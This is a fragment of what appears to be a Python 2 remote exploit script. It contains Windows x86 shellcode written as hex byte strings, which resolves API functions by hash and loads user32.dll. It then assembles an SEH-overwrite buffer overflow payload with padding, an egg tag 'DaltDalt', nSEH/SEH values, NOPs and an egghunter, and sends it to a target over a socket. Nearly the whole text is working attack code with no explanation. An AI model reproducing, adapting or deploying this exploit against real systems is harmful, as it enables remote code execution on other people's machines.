...
"\x60\x00\x00\x00\x5a\x55\x52\x89"
"\xc5\x8d\xb2\x17\x01\x00\x00\x8d"
"\xba\x23\x01\x00\x00\xe8\x80\x00"
"\x00\x00\x5a\x5d\x55\x52\x8d\x82"
"\x37\x01\x00\x00\x50\xff\x92\x27"
"\x01\x00\x00\x5a\x5d\x55\x52\x89"
"\xc5\x8d\xb2\x2b\x01\x00\x00\x8d"
"\xba\x33\x01\x00\x00\xe8\x58\x00"
"\x00\x00\x5a\x5d\x68\x67\x67\x65"
"\x00\x89\xe0\x6a\x00\x6a\x00\x50"
"\x6a\x00\x89\xd3\xff\x92\x33\x01"
"\x00\x00\x89\xda\x6a\x00\xff\x92"
"\x23\x01\x00\x00\xfc\x31\xff\x64"
...
"\xeb\x31\xc9\x57\x56\x8b\x36\x8b"
"\x3b\x01\xef\x52\x31\xd2\xc1\xc2"
"\x07\x32\x17\x47\x80\x3f\x00\x75"
"\xf5\x92\x5a\x39\xf0\x74\x0c\x83"
"\xc3\x04\x41\x39\x4a\x18\x75\xdf"
"\x5e\x5f\xc3\x5e\x5f\xad\x56\x53"
"\x89\xeb\x89\xde\x03\x5a\x24\x8d"
"\x04\x4b\x0f\xb7\x00\x8d\x04\x86"
"\x03\x42\x1c\x8b\x00\x01\xf0\xab"
"\x5b\x5e\x83\xc3\x04\x41\x81\x3e"
"\xff\xff\x00\x00\x75\xad\xc3\x19"
"\x2b\x90\x95\x26\x80\xac\xc8\xff"
"\xff\x00\x00\x01\x00\x00\x00\x02"
"\x00\x00\x00\x0d\x68\xbc\xab\xff"
"\xff\x00\x00\x03\x00\x00\x00\x75"
"\x73\x65\x72\x33\x32\x2e\x64\x6c"
"\x6c\x00")
...
payload = "AAAA" + "DaltDalt" + shellcode + nseh + seh + nops + eggh
socket.send(payload)
d = socket.recv(1024)
print d
